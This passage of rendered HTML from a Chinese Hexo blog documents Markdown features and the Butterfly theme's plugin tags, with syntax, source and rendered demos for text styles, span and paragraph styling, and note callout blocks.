id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用note">2.4 引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far 